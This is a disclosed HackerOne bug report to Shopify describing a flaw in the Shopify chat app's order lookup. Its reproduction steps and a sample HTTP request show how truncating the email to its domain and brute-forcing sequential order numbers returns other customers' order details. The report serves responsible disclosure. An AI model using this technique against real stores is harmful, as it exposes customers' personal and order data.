# Disclose customer orders details by shopify chat application.

## Report Details
- **Report ID**: 968165
- **URL**: https://hackerone.com/reports/968165
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-08-26T23:36:09.774Z
- **Disclosed**: 2022-05-14T14:33:41.032Z

## Reporter
- **Username**: zambo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hello Shopify Security Team!

 Bug Summary:
=============

This bug leads to disclose any store orders details ( including sensitive informations), through shopify chat app. the chat app can retrieve the orders details for unauthorized  user.

 Reproduction steps:
=============
  - install shopify chat applications.

Start Exploit : 
=============
+ Go to targeted store : 
+ Start a chat using the app.
+ Click on _I need an update on my order_.
+ fill out the Order ID and Email. ( fill the info randomly if you want to).
+ The bot respond.

█████


Exploit
=============

 Remove the first part of the email (keep only @hotmail/gmail/yahoo...).
 In normal situation the orders IDs start form #1000, and in the verification required the email and ID, So the attacker can brut force on the ID and retrive the order information of that ID with the same email  ISP because we removed the first email part.

 Request : 
=============

```
POST /api/storefront/conversations/lx9vF-DR31d1ePOOCS0Uw2lFUUBjhNqmMTOdkeM631M/order_lookup HTTP/1.1
Host: shopify-chat.shopifycloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://okbay44.myshopify.com/
Content-Type: application/json
X-Shopify-Chat-Shop-Identifier: █████████
Origin: https://okbay44.myshopify.com
Content-Length: 113
DNT: 1
Connection: close

{"order_lookup":{"email":"@gmail.com","order_number":"1005","user_token":"███"}}

```

Response :
=============

█████

## Impact

Retrive any customers data.

## Attachments
No attachments
